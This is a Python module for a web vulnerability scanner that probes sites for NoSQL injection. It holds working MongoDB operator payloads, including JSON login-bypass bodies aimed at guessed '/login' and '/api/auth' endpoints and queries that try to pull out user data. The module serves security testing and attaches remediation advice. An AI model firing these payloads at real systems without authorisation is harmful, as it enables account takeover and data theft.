"""
NoSQL Injection Scanner Module
Detects NoSQL injection vulnerabilities in MongoDB, CouchDB, and other NoSQL databases
"""

import re
import json
import time
from typing import Dict, List, Any, Optional
from urllib.parse import urlencode, parse_qs, urlparse, urljoin
from core.base_module import BaseModule


class Module(BaseModule):
    """NoSQL Injection vulnerability scanner"""

    def __init__(self, http_client=None, config: Optional[Dict] = None):
        super().__init__(http_client, config)
        self.name = "NoSQL Injection Scanner"
        self.description = "Detects NoSQL injection in MongoDB/CouchDB"
        self.payloads = []
        self.mongo_operators = ['$gt', '$ne', '$lt', '$regex', '$where', '$or', '$exists', '$in']
        self.time_based_delay = 3  # seconds

    def load_payloads(self) -> List[str]:
        """Load NoSQL injection payloads"""
        payloads = []
        try:
            import os
            payload_file = os.path.join(os.path.dirname(__file__), 'payloads.txt')
            if os.path.exists(payload_file):
                with open(payload_file, 'r', encoding='utf-8') as f:
                    for line in f:
                        line = line.strip()
                        if line and not line.startswith('#'):
                            payloads.append(line)
        except Exception:
            pass

        # Default payloads if file not found
        if not payloads:
            payloads = [
                '{"$gt": ""}',
                '{"$ne": ""}',
                '{"$regex": ".*"}',
                '{"$exists": true}',
                '{"$where": "1==1"}',
                '$ne',
                '$gt',
                '[$ne]=',
                '[$gt]=',
            ]

        self.payloads = payloads
        return payloads

    def run(self, target: str, params: Optional[Dict] = None) -> List[Dict[str, Any]]:
        """Run NoSQL injection scan"""
        results = []
        self.load_payloads()

        parsed = urlparse(target)
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        query_params = parse_qs(parsed.query)

        # Test URL parameters
        if query_params:
            for param_name in query_params:
                result = self._test_parameter(target, param_name, 'GET')
                if result:
                    results.append(result)

        # Test POST with JSON body (common for NoSQL APIs)
        json_result = self._test_json_body(target)
        if json_result:
            results.append(json_result)

        # Test common API endpoints
        api_results = self._test_api_endpoints(target)
        results.extend(api_results)

        return results

    def _test_parameter(self, url: str, param: str, method: str = 'GET') -> Optional[Dict]:
        """Test a specific parameter for NoSQL injection"""
        parsed = urlparse(url)
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        query_params = parse_qs(parsed.query)
        original_value = query_params.get(param, [''])[0]

        # Get baseline response
        try:
            baseline = self.http_client.get(url)
            baseline_length = len(baseline.text) if baseline else 0
            baseline_status = baseline.status_code if baseline else 0
        except Exception:
            return None

        # Test operator injection payloads
        test_payloads = [
            (f'{param}[$ne]=', 'operator'),
            (f'{param}[$gt]=', 'operator'),
            (f'{param}[$regex]=.*', 'operator'),
            (f'{param}[$exists]=true', 'operator'),
        ]

        for payload_suffix, payload_type in test_payloads:
            try:
                # Build test URL with array-style injection
                test_url = f"{base_url}?{payload_suffix}"

                # Add other params
                for p, v in query_params.items():
                    if p != param:
                        test_url += f"&{p}={v[0]}"

                response = self.http_client.get(test_url)

                if response and self._is_nosql_vulnerable(response, baseline, payload_type):
                    return {
                        'vulnerability': True,
                        'type': 'NoSQL Injection',
                        'severity': 'High',
                        'url': url,
                        'parameter': param,
                        'payload': payload_suffix,
                        'method': method,
                        'injection_type': 'Operator Injection',
                        'evidence': f"Response changed significantly with NoSQL operator. Status: {response.status_code}, Length: {len(response.text)}",
                        'description': f"NoSQL operator injection detected in parameter '{param}'. The application appears to be using unsanitized input in NoSQL queries.",
                        'recommendation': 'Sanitize user input, use parameterized queries, validate input types, and implement proper input validation for NoSQL databases.',
                        'cwe': 'CWE-943',
                        'owasp': 'A03:2021',
                        'cvss': 8.6,
                        'response': response.text[:1000] if response else ''
                    }
            except Exception:
                continue

        return None

    def _test_json_body(self, url: str) -> Optional[Dict]:
        """Test JSON body injection for NoSQL"""
        # Common login/auth endpoints
        test_endpoints = [
            '/api/login',
            '/api/auth',
            '/api/user',
            '/login',
            '/auth',
            '/api/v1/login',
            '/api/v1/auth',
        ]

        parsed = urlparse(url)
        base = f"{parsed.scheme}://{parsed.netloc}"

        # JSON payloads for auth bypass
        auth_payloads = [
            {"username": {"$ne": ""}, "password": {"$ne": ""}},
            {"username": {"$gt": ""}, "password": {"$gt": ""}},
            {"username": {"$regex": ".*"}, "password": {"$regex": ".*"}},
            {"username": {"$exists": True}, "password": {"$exists": True}},
            {"username": "admin", "password": {"$ne": ""}},
            {"username": {"$regex": "^admin"}, "password": {"$ne": ""}},
        ]

        # Test current URL if it looks like an API
        if '/api' in url.lower() or parsed.path.endswith(('login', 'auth', 'signin')):
            for payload in auth_payloads:
                try:
                    response = self.http_client.post(
                        url,
                        json=payload,
                        headers={'Content-Type': 'application/json'}
                    )

                    if response and self._is_auth_bypass(response):
                        return {
                            'vulnerability': True,
                            'type': 'NoSQL Injection',
                            'severity': 'Critical',
                            'url': url,
                            'parameter': 'JSON body',
                            'payload': json.dumps(payload),
                            'method': 'POST',
                            'injection_type': 'Authentication Bypass',
                            'evidence': f"Potential auth bypass detected. Status: {response.status_code}",
                            'description': 'NoSQL authentication bypass detected. The application accepts NoSQL operators in JSON body allowing authentication bypass.',
                            'recommendation': 'Validate input types strictly, reject objects where strings are expected, use schema validation.',
                            'cwe': 'CWE-943',
                            'owasp': 'A03:2021',
                            'cvss': 9.8,
                            'response': response.text[:1000] if response else ''
                        }
                except Exception:
                    continue

        return None

    def _test_api_endpoints(self, url: str) -> List[Dict]:
        """Test common API patterns for NoSQL injection"""
        results = []
        parsed = urlparse(url)
        base = f"{parsed.scheme}://{parsed.netloc}"

        # Test MongoDB-style query endpoints
        mongo_endpoints = [
            '/api/users?query=',
            '/api/search?q=',
            '/api/find?filter=',
        ]

        for endpoint in mongo_endpoints:
            test_url = urljoin(base, endpoint)

            # Test with JSON operator
            payloads_to_test = [
                '{"$where":"1==1"}',
                '{"$gt":""}',
                '{"$ne":null}',
            ]

            for payload in payloads_to_test:
                try:
                    full_url = test_url + payload
                    response = self.http_client.get(full_url)

                    if response and response.status_code == 200:
                        # Check for data leakage indicators
                        if self._has_data_indicators(response.text):
                            results.append({
                                'vulnerability': True,
                                'type': 'NoSQL Injection',
                                'severity': 'High',
                                'url': full_url,
                                'parameter': 'query',
                                'payload': payload,
                                'method': 'GET',
                                'injection_type': 'Data Extraction',
                                'evidence': f"NoSQL query injection returned data. Length: {len(response.text)}",
                                'description': 'NoSQL injection allows querying/extracting data from the database.',
                                'recommendation': 'Implement proper input validation and use safe query methods.',
                                'cwe': 'CWE-943',
                                'owasp': 'A03:2021',
                                'cvss': 8.6,
                                'response': response.text[:1000]
                            })
                            break
                except Exception:
                    continue

        return results

    def _is_nosql_vulnerable(self, response, baseline, payload_type: str) -> bool:
        """Determine if response indicates NoSQL injection"""
        if not response:
            return False

        # Check for significant response changes
        baseline_len = len(baseline.text) if baseline else 0
        response_len = len(response.text)

        # Significant length difference
        if baseline_len > 0:
            diff_ratio = abs(response_len - baseline_len) / baseline_len
            if diff_ratio > 0.3:  # 30% difference
                return True

        # Check for error messages indicating NoSQL
        error_patterns = [
            r'mongodb',
            r'mongoose',
            r'couchdb',
            r'nosql',
            r'\$where',
            r'\$regex',
            r'bson',
            r'objectid',
            r'invalid operator',
            r'query error',
            r'json.parse',
        ]

        for pattern in error_patterns:
            if re.search(pattern, response.text, re.IGNORECASE):
                return True

        # Status code change from error to success
        if baseline and baseline.status_code >= 400 and response.status_code == 200:
            return True

        return False

    def _is_auth_bypass(self, response) -> bool:
        """Check if response indicates successful auth bypass"""
        if not response:
            return False

        # Success indicators
        success_patterns = [
            r'"success"\s*:\s*true',
            r'"authenticated"\s*:\s*true',
            r'"token"\s*:',
            r'"jwt"\s*:',
            r'"session"\s*:',
            r'"user"\s*:\s*\{',
            r'welcome',
            r'dashboard',
            r'logged.?in',
        ]

        for pattern in success_patterns:
            if re.search(pattern, response.text, re.IGNORECASE):
                return True

        # Check for auth-related cookies
        if 'Set-Cookie' in response.headers:
            cookie = response.headers.get('Set-Cookie', '').lower()
            if any(x in cookie for x in ['session', 'token', 'auth', 'jwt']):
                return True

        return False

    def _has_data_indicators(self, text: str) -> bool:
        """Check if response contains data extraction indicators"""
        if not text:
            return False

        # Check for JSON array/object with multiple items
        try:
            data = json.loads(text)
            if isinstance(data, list) and len(data) > 0:
                return True
            if isinstance(data, dict) and len(data) > 2:
                return True
        except Exception:
            pass

        # Check for common data patterns
        data_patterns = [
            r'"_id"\s*:',
            r'"email"\s*:',
            r'"username"\s*:',
            r'"password"\s*:',
            r'"users"\s*:\s*\[',
            r'"data"\s*:\s*\[',
        ]

        for pattern in data_patterns:
            if re.search(pattern, text, re.IGNORECASE):
                return True

        return False
